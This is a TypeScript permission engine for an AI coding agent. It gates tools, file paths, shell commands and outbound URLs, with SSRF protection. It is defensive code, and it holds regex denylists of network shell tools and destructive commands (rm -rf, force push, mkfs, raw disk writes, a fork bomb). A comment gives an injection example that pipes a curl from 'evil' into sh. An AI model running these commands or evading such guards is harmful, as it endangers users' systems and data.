import { isIP } from 'node:net';
import { posix as posixPath } from 'node:path';
import { minimatch } from 'minimatch';
import {
  DEFAULT_ALLOWED_COMMANDS,
  DEFAULT_BLOCKED_PATHS,
  DEFAULT_CONFIG,
  DEFAULT_NETWORK_POLICY,
  type ExcaliburConfig,
  type NetworkPolicy,
} from '@excalibur/shared';
import { inspectUrl, isBlockedHostname, isBlockedIp } from './ssrf-guard';

/**
 * Permission engine (Build Contract §4.4, OSS spec §10.4 and §17,
 * onboarding spec §5 `standard-safe`).
 *
 * Pure decision logic — it never throws and never prompts. Callers turn
 * `requiresConfirmation` into an interactive question and `allowed: false`
 * into a `PermissionDeniedError` where appropriate.
 */

export type PermissionDecision = {
  allowed: boolean;
  requiresConfirmation: boolean;
  reason: string;
};

export type PermissionsConfig = ExcaliburConfig['permissions'];

type ToolFlag = boolean | 'ask';

/**
 * Fallback tool flags mirror `DEFAULT_CONFIG.permissions.tools` (single
 * source of truth): read-only tools allowed, mutating tools ask, network off.
 */
const FALLBACK_TOOL_FLAGS: Readonly<Record<string, ToolFlag>> =
  DEFAULT_CONFIG.permissions?.tools ?? {};

/** Unknown tools default to `ask` — the safe answer for anything unrecognized. */
const UNKNOWN_TOOL_FLAG: ToolFlag = 'ask';

const ALLOWED: PermissionDecision = Object.freeze({
  allowed: true,
  requiresConfirmation: false,
  reason: 'Allowed.',
});

function allow(reason: string): PermissionDecision {
  return { ...ALLOWED, reason };
}

function ask(reason: string): PermissionDecision {
  return { allowed: true, requiresConfirmation: true, reason };
}

function deny(reason: string): PermissionDecision {
  return { allowed: false, requiresConfirmation: false, reason };
}

/**
 * Normalizes a repository-relative path for matching (posix separators, no
 * leading `./`). CRITICALLY it COLLAPSES `..`/`.` segments first, so a blocked
 * pattern like `.env` still matches an evasion such as `src/../.env` — the
 * string handed to minimatch is the canonical path fs will actually open.
 */
function normalizeRelPath(relPath: string): string {
  const slashed = relPath.replace(/\\/g, '/').trim();
  // Guard the empty path: posix.normalize('') returns '.', which would slip
  // past the caller's empty-path denial — keep empty input empty.
  if (slashed.length === 0) {
    return '';
  }
  // posix.normalize collapses `a/../b` → `b`, `./x` → `x`, `a//b` → `a/b`.
  const collapsed = posixPath.normalize(slashed);
  return collapsed.replace(/^(\.\/)+/, '').replace(/^\/+/, '');
}

/** Collapses whitespace so `npm  test` matches the `npm test` allowlist entry. */
function normalizeCommand(command: string): string {
  return command.trim().replace(/\s+/g, ' ');
}

/** Shell control/metacharacters that enable chaining, pipes, subshells, redirection. */
const SHELL_METACHAR_RE = /[;&|`$<>\n()]/;
export function hasShellMetacharacters(command: string): boolean {
  return SHELL_METACHAR_RE.test(command);
}

/**
 * Best-effort denylist of network-capable shell binaries — used to deny egress
 * via `run_command` when `network.mode === 'off'` (the shell layer can't enforce
 * per-domain policy, so the governed path is `web_fetch`). Only blocks under
 * lockdown; with network on these fall through to the normal allowlist/confirm.
 */
const NETWORK_COMMAND_RE =
  /\b(curl|wget|nc|ncat|netcat|telnet|ssh|scp|sftp|ftp|rsync|http|https)\b|\bgit\s+(clone|fetch|pull|push)\b|\b(npm|pnpm|yarn|npx|pip|pip3|poetry|cargo|go|gem|bundle|brew|apt|apt-get)\s+(install|add|i|get|download|fetch|update|upgrade)\b/i;
export function isNetworkCommand(command: string): boolean {
  return NETWORK_COMMAND_RE.test(command);
}

/**
 * Catastrophic, (near-)irreversible shell operations — the destructive-command
 * SAFETY FLOOR. These are denied by default regardless of the allowlist, and
 * crucially even under auto-accept / `--yes` / non-interactive (where there is no
 * human to prompt), protecting the machine and the repo from a model slip or an
 * injected instruction. The agent has safe, governed tools for legitimate work
 * (write_file, edit, create_branch, apply_patch), so it never NEEDS these. A user
 * who genuinely wants one can opt back in by adding it explicitly to
 * `permissions.allowedCommands` (which lifts the floor for that exact command).
 *
 * Matched against the WHOLE normalized command (so a chained `foo && rm -rf x`
 * still trips). `git push --force-with-lease` is intentionally allowed (safe);
 * bare `--force`/`-f` is not.
 */
const DANGEROUS_COMMAND_RE = new RegExp(
  [
    // rm -rf / -fr / --recursive --force (any flag order/casing)
    'rm\\s+(?:-\\S*r\\S*f|-\\S*f\\S*r|-r\\s+-f|-f\\s+-r|--recursive\\s+--force|--force\\s+--recursive)',
    // force push (but NOT --force-with-lease)
    'git\\s+push\\b[^&|;]*(?:--force(?!-with-lease)|\\s-f\\b)',
    'git\\s+reset\\s+--hard', // discards uncommitted work
    'git\\s+clean\\s+-\\S*f', // -f / -fd / -fdx — deletes untracked files
    'git\\s+checkout\\s+--\\s+\\.', // discards all local changes
    '\\bsudo\\b', // privilege escalation — an agent must never sudo
    '\\bmkfs\\b',
    '\\bdd\\b[^&|;]*\\bof=/dev/', // raw disk write
    '>\\s*/dev/(?:sd|nvme|disk|hd)', // redirect onto a block device
    'chmod\\s+-R\\s+0?777\\s+/', // recursive 777 from root
    ':\\(\\)\\s*\\{[^}]*\\|', // fork bomb :(){ :|:& };:
    '\\b(?:shutdown|reboot|halt|poweroff)\\b',
  ].join('|'),
  'i',
);
export function isDangerousCommand(command: string): boolean {
  return DANGEROUS_COMMAND_RE.test(command);
}

export class PermissionEngine {
  private readonly toolFlags: Readonly<Record<string, ToolFlag>>;
  private readonly blockedPaths: ReadonlyArray<string>;
  private readonly allowedCommands: ReadonlyArray<string>;
  private readonly deniedCommands: ReadonlyArray<string>;
  private readonly network: NetworkPolicy;

  constructor(permissions?: PermissionsConfig) {
    // Per-tool overrides merge over the safe defaults; explicit blockedPaths /
    // allowedCommands lists replace the defaults entirely (the config loader
    // merges over DEFAULT_CONFIG, which carries the full default lists).
    this.toolFlags = { ...FALLBACK_TOOL_FLAGS, ...permissions?.tools };
    this.blockedPaths = permissions?.blockedPaths ?? DEFAULT_BLOCKED_PATHS;
    this.allowedCommands = permissions?.allowedCommands ?? DEFAULT_ALLOWED_COMMANDS;
    this.deniedCommands = permissions?.deniedCommands ?? [];
    this.network = permissions?.network ?? DEFAULT_NETWORK_POLICY;
  }

  /**
   * Whether the user DELIBERATELY opted a dangerous command in: an allowlist entry
   * that is ITSELF a destructive command (so it trips {@link isDangerousCommand})
   * and matches `command`. A broad `*`/`**` wildcard is therefore NOT an opt-in —
   * you must name the dangerous command (e.g. `git reset --hard*`) on purpose.
   */
  private dangerousOptIn(command: string): boolean {
    return this.allowedCommands.some(
      (entry) =>
        isDangerousCommand(entry) &&
        (normalizeCommand(entry) === command || minimatch(command, entry, { dot: true })),
    );
  }

  /** The first deny-glob matching the command, if any (deny beats allow). */
  private deniedBy(command: string): string | undefined {
    return this.deniedCommands.find(
      (entry) => normalizeCommand(entry) === command || minimatch(command, entry, { dot: true }),
    );
  }

  private flagFor(tool: string): ToolFlag {
    return this.toolFlags[tool] ?? UNKNOWN_TOOL_FLAG;
  }

  /** Returns the first blocked-path pattern matching the path, if any. */
  private blockedBy(normalizedPath: string): string | undefined {
    return this.blockedPaths.find((pattern) => minimatch(normalizedPath, pattern, { dot: true }));
  }

  private commandIsAllowlisted(command: string): boolean {
    // A command carrying shell control/metacharacters (chaining, pipes, command
    // substitution, redirection) is NEVER auto-allowed: an allowlist glob like
    // `npm test*` must not green-light `npm test; curl evil | sh`. Such commands
    // fall through to confirmation regardless of the run_command flag.
    if (hasShellMetacharacters(command)) {
      return false;
    }
    return this.allowedCommands.some(
      (entry) => normalizeCommand(entry) === command || minimatch(command, entry, { dot: true }),
    );
  }

  /**
   * Generic tool gate: `true` → allowed, `'ask'` → requires confirmation,
   * `false` → denied. Tools without a configured flag default to `'ask'`.
   */
  checkTool(tool: string): PermissionDecision {
    const flag = this.flagFor(tool);
    if (flag === false) {
      return deny(`Tool "${tool}" is disabled by permissions.tools.`);
    }
    if (flag === 'ask') {
      return ask(`Tool "${tool}" requires confirmation (permissions.tools is "ask").`);
    }
    return allow(`Tool "${tool}" is allowed by permissions.tools.`);
  }

  /**
   * Checks a repository-relative path against the blocked-path patterns
   * (minimatch, `dot: true`) and the read/write tool flags.
   */
  checkPath(relPath: string, op: 'read' | 'write'): PermissionDecision {
    const normalized = normalizeRelPath(relPath);
    if (normalized.length === 0) {
      return deny('Empty path.');
    }

    const blockedPattern = this.blockedBy(normalized);
    if (blockedPattern !== undefined) {
      return deny(`Path "${normalized}" is blocked by pattern "${blockedPattern}".`);
    }

    const tool = op === 'read' ? 'read_file' : 'write_file';
    const flag = this.flagFor(tool);
    if (flag === false) {
      return deny(`${op === 'read' ? 'Reading' : 'Writing'} files is disabled (${tool}: false).`);
    }
    if (flag === 'ask') {
      return ask(
        `${op === 'read' ? 'Reading' : 'Writing'} "${normalized}" requires confirmation (${tool}: "ask").`,
      );
    }
    return allow(`Path "${normalized}" is not blocked and ${tool} is allowed.`);
  }

  /**
   * Checks a shell command against the `run_command` tool flag and the
   * allowlist. Allowlisted commands follow the tool flag; commands outside
   * the allowlist always require confirmation (OSS spec §17: "ask before
   * running commands not in allowlist") unless the tool is disabled.
   */
  checkCommand(command: string): PermissionDecision {
    const normalized = normalizeCommand(command);
    if (normalized.length === 0) {
      return deny('Empty command.');
    }

    const flag = this.flagFor('run_command');
    if (flag === false) {
      return deny('Running commands is disabled (run_command: false).');
    }

    // SAFETY FLOOR: catastrophic/irreversible commands are denied regardless of
    // approval — even under auto-accept/--yes/non-interactive — UNLESS the user
    // DELIBERATELY opted this command in (see `dangerousOptIn`). This closes the
    // "autonomous run wild" gap: a model slip or injected instruction can no longer
    // auto-approve `rm -rf`, a force push, or `git reset --hard`. A broad `*`
    // allowlist does NOT lift the floor — the opt-in must name the dangerous command.
    if (isDangerousCommand(normalized) && !this.dangerousOptIn(normalized)) {
      return deny(
        `Command "${normalized}" is blocked by the destructive-command safety floor. ` +
          `Add the specific command to permissions.allowedCommands to opt in deliberately.`,
      );
    }

    // Deny-globs are a HARD deny that overrides the allowlist (deny beats allow):
    // a safety net for dangerous commands even when run_command is otherwise allowed.
    const deniedPattern = this.deniedBy(normalized);
    if (deniedPattern !== undefined) {
      return deny(
        `Command "${normalized}" is denied by permissions.deniedCommands ("${deniedPattern}").`,
      );
    }

    // Network lockdown: a command that needs egress is denied when network is off
    // (use the governed `web_fetch`/`web_search` tools, which honour the policy).
    if (this.network.mode === 'off' && isNetworkCommand(normalized)) {
      return deny(
        `Command "${normalized}" needs network egress, which is disabled (network.mode = off). Use web_fetch/web_search, or enable the network policy.`,
      );
    }

    const allowlisted = this.commandIsAllowlisted(normalized);
    if (!allowlisted) {
      return ask(
        `Command "${normalized}" is not in the allowedCommands allowlist; confirmation required.`,
      );
    }
    if (flag === 'ask') {
      return ask(
        `Command "${normalized}" is allowlisted but run_command is "ask"; confirmation required.`,
      );
    }
    return allow(`Command "${normalized}" is in the allowedCommands allowlist.`);
  }

  /**
   * Gates an outbound URL against the network policy. The SSRF floor (private /
   * loopback / metadata / obfuscated hosts) is a HARD deny that no mode or
   * confirmation overrides — only an explicit `allowPrivateHosts` entry does
   * (e.g. a local SearXNG). This is the SYNC layer; the fetch executor must also
   * run the async DNS re-check (`assertResolvesToPublic`) before connecting.
   */
  checkUrl(rawUrl: string): PermissionDecision {
    const inspected = inspectUrl(rawUrl);
    if ('error' in inspected) {
      return deny(inspected.error);
    }
    // Node's url.hostname returns IPv6 WITH brackets ("[::1]") — strip them so
    // the SSRF check sees a real IP literal.
    const host = inspected.url.hostname
      .toLowerCase()
      .replace(/^\[|\]$/g, '')
      .replace(/\.$/, '');
    const isPrivate = isBlockedHostname(host) || (isIP(host) !== 0 && isBlockedIp(host));
    const explicitlyAllowed = (this.network.allowPrivateHosts ?? []).some(
      (h) => h.toLowerCase() === host || minimatch(host, h, { dot: true }),
    );
    if (isPrivate && !explicitlyAllowed) {
      return deny(`Blocked network target "${host}" (private/loopback/metadata; SSRF protection).`);
    }
    if (this.network.mode === 'off') {
      return deny('Network is disabled (permissions.network.mode = off).');
    }
    if (this.network.mode === 'allowlist') {
      const ok = (this.network.allowedDomains ?? []).some((p) => minimatch(host, p, { dot: true }));
      if (!ok) {
        return deny(`Host "${host}" is not in permissions.network.allowedDomains.`);
      }
    }
    return this.network.approval === 'auto'
      ? allow(`Network access to "${host}" allowed (network.approval = auto).`)
      : ask(`Network access to "${host}" requires confirmation.`);
  }

  /**
   * Gates a network TOOL whose concrete destination host is only resolved at
   * execution time (e.g. `web_search`, where the backend — local SearXNG vs
   * DuckDuckGo vs a paid API — is chosen later). Mirrors {@link checkUrl}'s
   * mode/approval logic WITHOUT a host: lockdown (`mode = off`) is a hard deny;
   * otherwise the approval posture decides allow-vs-ask. The executor still runs
   * the per-host SSRF/allowlist check on each concrete provider URL it contacts.
   */
  checkNetwork(): PermissionDecision {
    if (this.network.mode === 'off') {
      return deny('Network is disabled (permissions.network.mode = off).');
    }
    return this.network.approval === 'auto'
      ? allow('Network access allowed (network.approval = auto).')
      : ask('Network access requires confirmation.');
  }

  /** Whether a public host is permitted by the policy (allowlist + SSRF floor). */
  isUrlAllowed(rawUrl: string): boolean {
    return this.checkUrl(rawUrl).allowed;
  }
}
